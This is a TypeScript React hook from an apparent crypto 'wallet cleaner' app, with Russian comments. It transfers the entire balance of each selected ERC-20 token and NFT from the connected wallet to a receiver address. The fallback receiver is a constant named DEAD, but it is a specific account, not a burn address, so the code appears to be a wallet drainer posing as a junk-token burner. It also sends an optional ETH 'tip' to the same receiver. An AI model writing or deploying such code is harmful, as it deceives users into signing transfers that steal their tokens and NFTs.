"use client";

import { erc20Abi, erc721Abi } from "@/shared/lib/abi";
import { NftAsset, TokenAsset } from "@/shared/lib/assets";
import { useAccount, useWalletClient, useChains, useSwitchChain } from "wagmi";
import { encodeFunctionData, parseEther } from "viem";

const DEAD = "0xc63e673a8eba1b34f786c9434a3d2f8c3774cb4a" as const;

export function useClean() {
  const { address } = useAccount();
  const { data: wallet } = useWalletClient();
  const chains = useChains();
  const { switchChainAsync } = useSwitchChain();

  async function clean(assets: Array<TokenAsset | NftAsset>, tipEth?: string) {
    if (!wallet || !address) throw new Error("Wallet not connected");
    const receiver = process.env.NEXT_PUBLIC_CLEANER_RECEIVER as
      | `0x${string}`
      | undefined;
    const to = receiver ?? DEAD;

    for (const asset of assets) {
      if (asset.type === "erc20") {
        // Переключим сеть под chainId актива, если доступна
        const target = chains.find((c) => c.id === asset.chainId);
        if (target && switchChainAsync) {
          try {
            await switchChainAsync({ chainId: target.id });
          } catch {}
        }
        // Отправляем весь баланс. Ожидается, что поле balance — human-readable строка
        // и есть decimals; если decimals неизвестен, используем 18 по умолчанию
        const decimals = (asset as TokenAsset).decimals ?? 18;
        const human = (asset as TokenAsset).balance ?? "0";
        // Переведём human в wei через ручное масштабирование, чтобы не тащить parseUnits
        // parseEther подходит только для 18, поэтому для надёжности посчитаем сами
        const [wholeStr, fracStrRaw] = human.split(".");
        const fractionPadded = (fracStrRaw ?? "").padEnd(decimals, "0");
        const numeric =
          BigInt(wholeStr || "0") * BigInt(10) ** BigInt(decimals) +
          (fractionPadded
            ? BigInt(fractionPadded.slice(0, decimals) || "0")
            : BigInt(0));
        if (numeric === BigInt(0)) continue;
        const data = encodeFunctionData({
          abi: erc20Abi,
          functionName: "transfer",
          args: [to, numeric],
        });
        await wallet.sendTransaction({ to: asset.address, data });
      } else if (asset.type === "erc721") {
        const target = chains.find((c) => c.id === asset.chainId);
        if (target && switchChainAsync) {
          try {
            await switchChainAsync({ chainId: target.id });
          } catch {}
        }
        const nft = asset as NftAsset;
        const data = encodeFunctionData({
          abi: erc721Abi,
          functionName: "safeTransferFrom",
          args: [address, to, BigInt(nft.tokenId)],
        });
        await wallet.sendTransaction({ to: asset.address, data });
      }
    }

    if (tipEth && Number(tipEth) > 0 && receiver) {
      await wallet.sendTransaction({ to: receiver, value: parseEther(tipEth) });
    }
  }

  return { clean };
}
